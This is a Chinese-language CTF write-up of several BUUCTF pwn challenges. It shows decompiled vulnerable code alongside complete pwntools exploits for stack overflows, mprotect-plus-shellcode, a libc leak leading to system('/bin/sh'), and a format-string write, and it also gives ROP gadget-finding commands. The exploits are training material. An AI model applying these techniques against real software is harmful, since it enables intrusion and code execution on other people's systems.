<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --opcode &lt;opcode&gt; --type &lt;type&gt; --sort &lt;sort_type&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>生成 ROP 链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f &lt;binary_file&gt; --chain <span class="string">&quot;&lt;gadget1&gt;;&lt;gadget2&gt;;...&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>显示帮助信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --help</span><br></pre></td></tr></table></figure></li>
</ol>
<p>上述命令中的 <code>&lt;binary_file&gt;</code> 是要分析的二进制文件的路径。</p>
<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb      <strong>说明即使是32位的在执行syscall时的参数仍然在寄存器中</strong></li>
<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>但是呢没有&#x2F;bin&#x2F;sh所以在栈上构造</p>
<p>所以泄露栈？</p>
<p>但是我们发现好像没法玩，因为什么都没有</p>
<p>这时候是在搞不了发现原来有后门函数，真的绷不住了</p>
<p>首先shift+F12找到有个flag.txt字符串，然后ctrl+x找到调用的函数</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211042.png" alt="image-20240306192130678" style="zoom:50%;" />

<p>然后发现只有fget，实在是不会了，该flag位置在0x80ECA2D然后ctrl+s有rw权限因此读flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211043.png" alt="image-20240306193620444"></p>
<p>但是有个问题，我发现<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211044.png" alt="image-20240306195251819"></p>
<p>他根本没有push ebp，靠！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26826</span>)</span><br><span class="line"></span><br><span class="line">flag_addr=<span class="number">0x80ECA2D</span></span><br><span class="line">backdoor=<span class="number">0x80489A0</span></span><br><span class="line"><span class="built_in">printf</span>=<span class="number">0x0804f0a0</span></span><br><span class="line"><span class="built_in">exit</span>=<span class="number">0x0804e660</span></span><br><span class="line">pal=<span class="number">0x2d</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(backdoor)+p32(<span class="built_in">printf</span>)+p32(<span class="built_in">exit</span>)+p32(flag_addr)</span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="二解"><a href="#二解" class="headerlink" title="二解"></a>二解</h3><p>我一开始的思路是利用main函数里的gets造成溢出，覆盖返回地址去读出flag，然后利用get_secret函数的输入点造成溢出然后覆盖返回地址到write函数的地址，打印出unk_80CF91B里的flag的内容，但是后来在百度fgets的用法的时候，发现它能够避免造成溢出，而且fl4g在bss段，没有ret指令可以继续控制程序。</p>
<p>后来我在程序了发现了mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell，这题的做法跟get_started_3dsctf_2016这题类似</p>
<p>由于需要利用ret指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret&#x3D;0x806fcc8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary not_the_same_3dsctf_2016 --only <span class="string">&quot;pop|ret&quot;</span>|grep pop</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211045.png" alt="在这里插入图片描述"></p>
<p>ctrl+s调出程序的段表，将.got.plt段改为可读可写可执行,addr&#x3D;0x80eb000</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br></pre></td></tr></table></figure>


<p>将返回地址填写成read函数，设置read函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最好读入shellcode</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(len(shellcode))+p32(addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br></pre></td></tr></table></figure>

<p>完整EXP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29651</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(len(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>exp看的不是很懂，但是大概理解意思</p>
<h2 id="iscn-2019-ne-5"><a href="#iscn-2019-ne-5" class="headerlink" title="iscn_2019_ne_5"></a>iscn_2019_ne_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<p>在做这道题的时候，发现自己32位传参还是有一定的不理解</p>
<p>32位传参：</p>
<p>一般是依靠类似于</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">垃圾数据+ret_addr+某返回地址(bbbb)+arg1+arg2+.....</span><br></pre></td></tr></table></figure>

<p>这样子的，因为ret_addr的后面要紧跟某一个要返回的地址，这个东西编译器会处理好的，但是如果想要一次调用两个以上的函数，应该要先弹栈</p>
<p>例如:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr+pop|ret+/bin/sh_addr+下一个函数</span><br></pre></td></tr></table></figure>

<p>如此如此</p>
<p>还有一个问题便是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)src = <span class="number">48</span>;</span><br></pre></td></tr></table></figure>

<p>ida里的一个语句，我点进去src的时候发现src在栈上，但是src是一个地址，所以我很好奇src到底是在栈上还是在栈上的一个地址，其实src就是在栈上，但是其指向的不一定在栈上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>src可控显然栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:/mnt/hgfs/shared/ctf-learn$ ROPgadget --binary ciscn_2019_ne_5 --<span class="built_in">string</span> <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x080482ea</span> : sh</span><br></pre></td></tr></table></figure>

<p>找到sh，幸运的是sh是flussh的sh其后面\x00截断，不然打不了</p>
<h2 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>溢出6个地址的长度，1个ebp所以只有一次只有5个，返回地址改main，4个地址长度</p>
<p>那么这里啥都没有，所以先泄露libc版本，然后system(‘’&#x2F;bin&#x2F;sh’)即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pal=(<span class="number">0x88</span>+<span class="number">4</span>)*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">sh.send(pal)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;write_addr===&gt;&quot;</span>,hex(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pal=(<span class="number">0x88</span>+<span class="number">4</span>)*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(system_addr)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(binsh_addr)</span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<p>与上题一样</p>
<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/shared/ctf-learn/2020_babystack2&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的整数溢出，一个输入0可以几乎无限溢出</p>
<p>然后一个backdoor</p>
<p>就搞定了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line"><span class="meta">#r=process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span></span><br><span class="line">backdoor_addr=<span class="number">0x400726</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x10</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(backdoor_addr)</span><br><span class="line">r.recvuntil(b<span class="number">&#x27;</span>[+]What\<span class="string">&#x27;s u name?&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是一个任意地址读x&#x3D;4就行啦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26902</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">over_flow=<span class="number">0x0804A02C</span></span><br><span class="line">pal=p32(over_flow)+b<span class="number">&#x27;</span>%<span class="number">11</span>$n<span class="number">&#x27;</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<p>本题就是一个溢出然后一个后门</p>
<p>因为retn之前没有leave所以没有ebp</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>

<p>后门</p>
<h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<p>常规rop</p>
<h2 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line"> RELRO:    Partial RELRO</span><br><span class="line"> Stack:    No canary found</span><br><span class="line"> NX:       NX enabled</span><br><span class="line"> PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是系统调用read和write，搞得不能泄露libc基址，很显然栈溢出</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211046.png" alt="image-20240306231221635" style="zoom: 50%;" />

<p>没有leave，因此0x10后面就是ret</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211047.png" alt="image-20240306231332851"></p>
<p>两个gadget，一个rax&#x3D;15是sigreturn ，一个是rax&#x3D;59是execve</p>
<p>而vuln是系统调用就有syscall</p>
<p>那么很显然是SROP，万事俱备只差&#x2F;bin&#x2F;sh\x00的addr</p>
<p>那只能自己写</p>
<p>那就只能调用read_write看看能不能写到跟&#x2F;bin&#x2F;sh\x00偏移固定的地址啦</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211048.png" alt="image-20240307010520356" style="zoom:50%;" />

<p>这个东西一看就知道是地址，就gdb进去看，然后出来看，减一下</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211049.png" alt="image-20240307010810093" style="zoom:50%;" />

<p>突然发觉可以用search，记下来</p>
<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211050.png" alt="image-20240307010855890" style="zoom:50%;" />

<p>偏移是128：这是一个大坑，因为glibc版本不同，他的偏移也是不同的！！！！其实是0x118偏移，但是不改libc版本就是0x128偏移</p>
<p>因为buf是在rsp+10，而write能写0x30个字节，那么就会有rbp在里面</p>
